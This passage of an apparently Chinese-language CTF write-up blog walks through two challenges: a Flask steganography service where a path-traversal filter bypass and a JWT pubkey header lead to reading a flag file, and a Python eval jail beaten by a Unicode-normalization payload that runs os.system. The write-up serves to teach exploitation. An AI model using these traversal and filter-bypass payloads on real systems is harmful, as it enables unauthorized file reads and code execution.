+        <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;Something went wrong! Check your file name&#39;</span><span style=color:#111>,</span> <span style=color:#ae81ff>400</span>
+
+
+
+<span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#111>run</span><span style=color:#111>(</span><span style=color:#d88200>&#39;0.0.0.0&#39;</span><span style=color:#111>,</span> <span style=color:#ae81ff>1337</span><span style=color:#111>)</span>
+
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># util.py</span>
+<span style=color:#f92672>from</span> <span style=color:#111>PIL</span> <span style=color:#f92672>import</span> <span style=color:#111>Image</span>
+<span style=color:#f92672>import</span> <span style=color:#111>random</span>
+<span style=color:#f92672>import</span> <span style=color:#111>jwt</span>
+<span style=color:#f92672>import</span> <span style=color:#111>string</span>
+<span style=color:#f92672>import</span> <span style=color:#111>os</span>
+<span style=color:#f92672>from</span> <span style=color:#111>imghdr</span> <span style=color:#f92672>import</span> <span style=color:#111>tests</span>
+<span style=color:#f92672>import</span> <span style=color:#111>subprocess</span>
+
+<span style=color:#111>priv_key</span> <span style=color:#f92672>=</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#d88200>&#39;keys/private.pem&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;r&#39;</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>create_token</span><span style=color:#111>():</span>
+    <span style=color:#111>priv_key</span> <span style=color:#f92672>=</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#d88200>&#39;keys/private.pem&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;r&#39;</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span>
+    <span style=color:#111>token</span> <span style=color:#f92672>=</span> <span style=color:#111>jwt</span><span style=color:#f92672>.</span><span style=color:#111>encode</span><span style=color:#111>({</span><span style=color:#d88200>&#34;username&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#34;guest_</span><span style=color:#d88200>{</span><span style=color:#111>random</span><span style=color:#f92672>.</span><span style=color:#111>randint</span><span style=color:#111>(</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span><span style=color:#ae81ff>10000</span><span style=color:#111>)</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;</span><span style=color:#111>},</span> <span style=color:#111>priv_key</span><span style=color:#111>,</span> <span style=color:#111>algorithm</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;RS256&#39;</span><span style=color:#111>,</span> <span style=color:#111>headers</span><span style=color:#f92672>=</span><span style=color:#111>{</span><span style=color:#d88200>&#39;pubkey&#39;</span><span style=color:#111>:</span> <span style=color:#d88200>&#39;public.pem&#39;</span><span style=color:#111>})</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>token</span>
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>verify_token</span><span style=color:#111>(</span><span style=color:#111>token</span><span style=color:#111>):</span>
+    <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
+        <span style=color:#111>headers</span> <span style=color:#f92672>=</span> <span style=color:#111>jwt</span><span style=color:#f92672>.</span><span style=color:#111>get_unverified_header</span><span style=color:#111>(</span><span style=color:#111>token</span><span style=color:#111>)</span>
+        <span style=color:#111>pub_key_path</span> <span style=color:#f92672>=</span> <span style=color:#111>headers</span><span style=color:#111>[</span><span style=color:#d88200>&#39;pubkey&#39;</span><span style=color:#111>]</span>
+        <span style=color:#111>pub_key_path</span> <span style=color:#f92672>=</span> <span style=color:#111>pub_key_path</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39;..&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>)</span> <span style=color:#75715e># no traversal!</span>
+        <span style=color:#111>pub_key_path</span> <span style=color:#f92672>=</span> <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>path</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>getcwd</span><span style=color:#111>(),</span> <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>path</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#d88200>&#39;keys/&#39;</span><span style=color:#111>,</span> <span style=color:#111>pub_key_path</span><span style=color:#111>))</span>
+        <span style=color:#111>pub_key</span> <span style=color:#f92672>=</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#111>pub_key_path</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;rb&#39;</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span>
+        <span style=color:#00a8c8>if</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;BEGIN PUBLIC KEY&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> <span style=color:#111>pub_key</span><span style=color:#111>:</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>False</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>jwt</span><span style=color:#f92672>.</span><span style=color:#111>decode</span><span style=color:#111>(</span><span style=color:#111>token</span><span style=color:#111>,</span> <span style=color:#111>pub_key</span><span style=color:#111>,</span> <span style=color:#111>algorithms</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#39;RS256&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;HS256&#39;</span><span style=color:#111>])</span>
+    <span style=color:#00a8c8>except</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>False</span>
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>rand_string</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#111>random</span><span style=color:#f92672>.</span><span style=color:#111>choice</span><span style=color:#111>(</span><span style=color:#111>string</span><span style=color:#f92672>.</span><span style=color:#111>ascii_letters</span> <span style=color:#f92672>+</span> <span style=color:#111>string</span><span style=color:#f92672>.</span><span style=color:#111>digits</span><span style=color:#111>)</span> <span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>32</span><span style=color:#111>))</span>
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>embed_file</span><span style=color:#111>(</span><span style=color:#111>embed_file</span><span style=color:#111>,</span> <span style=color:#111>cover_file</span><span style=color:#111>,</span> <span style=color:#111>stegfile</span><span style=color:#111>,</span> <span style=color:#111>password</span><span style=color:#111>):</span>
+    <span style=color:#111>cmd</span> <span style=color:#f92672>=</span> <span style=color:#111>subprocess</span><span style=color:#f92672>.</span><span style=color:#111>Popen</span><span style=color:#111>([</span><span style=color:#d88200>&#39;steghide&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;embed&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;-ef&#39;</span><span style=color:#111>,</span> <span style=color:#111>embed_file</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;-cf&#39;</span><span style=color:#111>,</span> <span style=color:#111>cover_file</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;-sf&#39;</span><span style=color:#111>,</span> <span style=color:#111>stegfile</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;-p&#39;</span><span style=color:#111>,</span> <span style=color:#111>password</span><span style=color:#111>])</span><span style=color:#f92672>.</span><span style=color:#111>wait</span><span style=color:#111>(</span><span style=color:#111>timeout</span><span style=color:#f92672>=</span><span style=color:#ae81ff>.5</span><span style=color:#111>)</span>
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>cleanup</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>for</span> <span style=color:#111>f</span> <span style=color:#f92672>in</span> <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>listdir</span><span style=color:#111>(</span><span style=color:#d88200>&#39;uploads/&#39;</span><span style=color:#111>):</span>
+        <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>remove</span><span style=color:#111>(</span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>path</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#d88200>&#39;uploads/&#39;</span><span style=color:#111>,</span> <span style=color:#111>f</span><span style=color:#111>))</span>
+    <span style=color:#00a8c8>for</span> <span style=color:#111>f</span> <span style=color:#f92672>in</span> <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>listdir</span><span style=color:#111>(</span><span style=color:#d88200>&#39;output/&#39;</span><span style=color:#111>):</span>
+        <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>remove</span><span style=color:#111>(</span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>path</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#d88200>&#39;output/&#39;</span><span style=color:#111>,</span> <span style=color:#111>f</span><span style=color:#111>))</span>
+
+</code></pre></div><p>页面上可以以任意的content和passwd上传一个jpg/jpeg文件，之后可以下载<code>filename.jpg_guest_3295</code>这样的一个文件，并且我们的jwt会更新，其中username部分就是拼在<code>.jpg</code>后面的内容</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214104631768.png alt=image-20211214104631768></p>
+<p>康关键部分源码</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214104825347.png alt=image-20211214104825347></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214095218675.png alt=image-20211214095218675></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214103556446.png alt=image-20211214103556446></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214110203558.png alt=image-20211214110203558></p>
+<p>利用<code>os.path.join()</code>我们可以直接得到一个不受干扰的绝对路径，类似这样</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>path</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#d88200>&#39;amiz/tmp&#39;</span><span style=color:#111>,</span><span style=color:#d88200>&#39;/etc/passwd&#39;</span><span style=color:#111>)</span>
+<span style=color:#d88200>&#39;/etc/passwd&#39;</span>
+</code></pre></div><p>上传的文件名是直接拼在<code>os.path.join</code>中的，过滤了<code>../</code>，我们可以使用<code>..././</code>的方式来绕过（过滤之后拼起来正好是<code>../</code>，可以做到路径穿越，不过文件名还会有一个<code>_</code>下划线，我们的穿越目标路径需要本身就带有下划线使其不穿帮，我们选择<code>/proc/self/map_files</code></p>
+<p>验证cookie是否合法的时候是在文件上传之后的事情，所以我们可以用我们上传的文件做public.key</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>image_data</span> <span style=color:#f92672>=</span> <span style=color:#111>uploaded_file</span><span style=color:#f92672>.</span><span style=color:#111>stream</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span>
+<span style=color:#111>image_md5</span> <span style=color:#f92672>=</span> <span style=color:#111>hashlib</span><span style=color:#f92672>.</span><span style=color:#111>md5</span><span style=color:#111>(</span><span style=color:#111>image_data</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>hexdigest</span><span style=color:#111>()</span>
+<span style=color:#111>image_path</span> <span style=color:#f92672>=</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;uploads/</span><span style=color:#d88200>{</span><span style=color:#111>image_md5</span><span style=color:#d88200>}</span><span style=color:#d88200>.jpeg&#39;</span>
+</code></pre></div><p>我们的图片路径就在<code>/app/uploads/{image_md5}.jpeg</code>下，是固定可指向的（绝对路径）</p>
+<p>所以整个思路就是：先上传一个含有公钥的jpeg图片，之后上传一个正常的jpg图片，这次要修改文件名</p>
+<pre tabindex=0><code>..././..././..././..././..././proc/self/map
+</code></pre><p>再配合我们的jwt，其中的username部分就得是这样</p>
+<pre tabindex=0><code>files/../../../app/flag.txt
+</code></pre><p>pubkey部分指向我们图片的绝对路径</p>
+<pre tabindex=0><code>/app/uploads/{image_md5}.jpeg
+</code></pre><p>这样，上传之后经过拼接 最终路径将会是</p>
+<pre tabindex=0><code>output/../../../../../proc/self/map_files/../../../app/flag.txt
+</code></pre><p>这样在下载时就做到了任意文件读取，得到flag</p>
+<p>————肥肠巧妙的思路了！之前做jwt相关的题固定套路都是ssti获取key，伪造cookie就好了，而这个跟文件还有结合，之前没见过</p>
+<h2 id=miscprofanity-check>Misc/Profanity Check</h2>
+<blockquote>
+<p>once tried to filter messages for profanity using a discord bot. I failed. <code>nc profanity-check.chal.idek.team 1337</code></p>
+<p><a href=https://ctf.idek.team/handouts/misc/ProfanityCheck/profanity_check.py>https://ctf.idek.team/handouts/misc/ProfanityCheck/profanity_check.py</a></p>
+</blockquote>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#/usr/bin/env python3</span>
+
+<span style=color:#f92672>from</span> <span style=color:#111>unicodedata</span> <span style=color:#f92672>import</span> <span style=color:#111>normalize</span>
+<span style=color:#f92672>import</span> <span style=color:#111>random</span>
+
+<span style=color:#111>i</span> <span style=color:#f92672>=</span> <span style=color:#111>input</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&gt;&gt;&gt; &#34;</span><span style=color:#111>)</span>
+
+<span style=color:#00a8c8>for</span> <span style=color:#111>n</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>10000</span><span style=color:#111>):</span>
+  <span style=color:#00a8c8>if</span> <span style=color:#111>random</span><span style=color:#f92672>.</span><span style=color:#111>choice</span><span style=color:#111>(</span><span style=color:#d88200>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span><span style=color:#111>)</span> <span style=color:#f92672>in</span> <span style=color:#111>i</span><span style=color:#111>:</span>
+    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Profanity detected. Exiting.&#34;</span><span style=color:#111>)</span>
+    <span style=color:#111>exit</span><span style=color:#111>(</span><span style=color:#ae81ff>0</span><span style=color:#111>)</span>
+
+<span style=color:#111>i</span> <span style=color:#f92672>=</span> <span style=color:#111>normalize</span><span style=color:#111>(</span><span style=color:#d88200>&#34;NFC&#34;</span><span style=color:#111>,</span> <span style=color:#111>i</span><span style=color:#111>)</span>
+
+<span style=color:#111>blacklist</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>&#34;__&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;()&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;{&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;}&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;[&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;]&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;;&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;:&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;!&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;@&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;#&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;$&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;%&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;^&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;&amp;&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;*&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;,&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;class&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;mro&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;sub&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;glob&#34;</span><span style=color:#111>]</span>
+
+<span style=color:#00a8c8>for</span> <span style=color:#111>n</span> <span style=color:#f92672>in</span> <span style=color:#111>blacklist</span><span style=color:#111>:</span>
+  <span style=color:#00a8c8>if</span> <span style=color:#111>n</span> <span style=color:#f92672>in</span> <span style=color:#111>i</span><span style=color:#111>:</span>
+    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Profanity detected. Exiting.&#34;</span><span style=color:#111>)</span>
+    <span style=color:#111>exit</span><span style=color:#111>(</span><span style=color:#ae81ff>0</span><span style=color:#111>)</span>
+
+<span style=color:#111>eval</span><span style=color:#111>(</span><span style=color:#111>i</span><span style=color:#111>)</span>
+
+</code></pre></div><p>很明显需要绕过这个waf来rce，没有被过滤的有单双引号和数字，所以我们可以用八进制，比如这样</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>eval</span><span style=color:#111>(</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\150\145\154\160\50\51\40</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#75715e># eval(help())</span>
+</code></pre></div><p>但是这里用8进制并不可以被<code>eval</code>执行，因为本地是这样的</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213115540592.png alt=image-20211213115540592></p>
+<p>但是通过<code>input</code>传过去之后会被转义，再加一个反斜杠</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213115722152.png alt=image-20211213115722152></p>
+<p>那肯定会想再加反斜杠呗？</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213120106808.png alt=image-20211213120106808></p>
+<p>本来我们的<code>\</code>反斜杠是用来做8进制的引导字符的，结果这样处理会变成纯纯的字符串，越描越黑了</p>
+<p>显然这样是执行不了命令的（也可能是我知道的太少了，欢迎各位师傅分享），我们这里用unicode的小trick</p>
+<p>做题多一点的师傅应该就能明白啥意思了，一个常考的点是注册<code>ªdmin</code>的账户来伪造<code>admin</code>，这里也是同理；代码中有一个缺陷：先过滤黑名单字符再进行<code>normalize()</code>，这会导致特殊的unicode字符会先顺利通过过滤，再被<code>normalize()</code>转为正常字符，最终命令执行</p>
+<p>这里是个exp</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
+<span style=color:#111>letters</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>&#39;ª&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ᵇ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ᶜ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ᵈ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ᵉ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ᶠ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ᵍ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ʰ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ⁱ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ʲ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ᵏ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ˡ&#39;</span><span style=color:#111>,</span>
+           <span style=color:#d88200>&#39;ᵐ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ⁿ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;º&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ᵖ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ｑ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ʳ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ˢ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ₜ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ᵘ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ᵛ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ʷ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ˣ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ʸ&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ᶻ&#39;</span><span style=color:#111>]</span>
+
+<span style=color:#75715e># payload = &#34;print(__import__(&#39;os&#39;).system(&#39;ls&#39;))&#34;</span>
+<span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;print(__import__(&#39;os&#39;).system(&#39;cat flag.txt&#39;))&#34;</span>
+<span style=color:#111>exploit</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;ᵉᵛªˡ(&#39;&#39;&#34;</span>
+
+<span style=color:#00a8c8>for</span> <span style=color:#111>char</span> <span style=color:#f92672>in</span> <span style=color:#111>payload</span><span style=color:#111>:</span>
+    <span style=color:#111>exploit</span> <span style=color:#f92672>+=</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#34;+ᶜʰʳ(</span><span style=color:#d88200>{</span><span style=color:#111>ord</span><span style=color:#111>(</span><span style=color:#111>char</span><span style=color:#111>)</span><span style=color:#d88200>}</span><span style=color:#d88200>)&#34;</span>
+
+<span style=color:#111>exploit</span> <span style=color:#f92672>+=</span> <span style=color:#d88200>&#34;)&#34;</span>
+
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>exploit</span><span style=color:#111>)</span>
+<span style=color:#75715e># ᵉᵛªˡ(&#39;&#39;+ᶜʰʳ(112)+ᶜʰʳ(114)+ᶜʰʳ(105)+ᶜʰʳ(110)+ᶜʰʳ(116)+ᶜʰʳ(40)+ᶜʰʳ(95)+ᶜʰʳ(95)+ᶜʰʳ(105)+ᶜʰʳ(109)+ᶜʰʳ(112)+ᶜʰʳ(111)+ᶜʰʳ(114)+ᶜʰʳ(116)+ᶜʰʳ(95)+ᶜʰʳ(95)+ᶜʰʳ(40)+ᶜʰʳ(39)+ᶜʰʳ(111)+ᶜʰʳ(115)+ᶜʰʳ(39)+ᶜʰʳ(41)+ᶜʰʳ(46)+ᶜʰʳ(115)+ᶜʰʳ(121)+ᶜʰʳ(115)+ᶜʰʳ(116)+ᶜʰʳ(101)+ᶜʰʳ(109)+ᶜʰʳ(40)+ᶜʰʳ(39)+ᶜʰʳ(99)+ᶜʰʳ(97)+ᶜʰʳ(116)+ᶜʰʳ(32)+ᶜʰʳ(102)+ᶜʰʳ(108)+ᶜʰʳ(97)+ᶜʰʳ(103)+ᶜʰʳ(46)+ᶜʰʳ(116)+ᶜʰʳ(120)+ᶜʰʳ(116)+ᶜʰʳ(39)+ᶜʰʳ(41)+ᶜʰʳ(41))</span>
+</code></pre></div><p>更多的相似unicode可以参考这个网站->https://www.compart.com/en/unicode</p>
+<pre tabindex=0><code># 这样的也可以捏
+ｐｒｉｎｔ(ｏｐｅｎ(ｃｈｒ(102) + ｃｈｒ(108) + ｃｈｒ(97) + ｃｈｒ(103) + ｃｈｒ(46) + ｃｈｒ(116) + ｃｈｒ(120) + ｃｈｒ(116)).ｒｅａｄ(115))
+</code></pre><p>参考：<a href=https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html>WAF Bypassing with Unicode Compatibility</a></p>
+<hr>
+<p>少了三道js的题，我的，下次一定！</p>
+<p>另外steghide-as-a-service这道题感谢师傅的帮助（我自己卡到一个很蠢的地方了</p>
+<p>最近有点摆烂，属于是春困秋乏里面的冬眠了，我尽量保持一个好的状态</p>
+</div>
+</section>
+</article>
+</main>
+<div class="w-full h-0 flex-none order-3"></div>
+<aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
+<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
+<div class="md:max-w-xs flex flex-col md:items-end">
+<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
+<li class="px-1 md:px-0">
+<a href=/posts/ title="Posts page">
+Posts
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/relax/ title="Relaxxx page">
+Relaxxx
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/categories/ title="Categories page">
+Categories
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/tags/ title="Tags page">
+Tags
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/series/ title="Series page">
+Series
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/about/ title="About page">
+About
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/friends/ title="Friends page">
+Friends
+</a>
+</li>
+<div id=fastSearch class=m-0>
+<input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
+placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
+<ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400">
+</ul>
+</div>
+</ul>
+<div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16">
+<a href=https://space.bilibili.com/1651059195 target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg>
+</div>
+</a>
+<a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg>
+</div>
+</a>
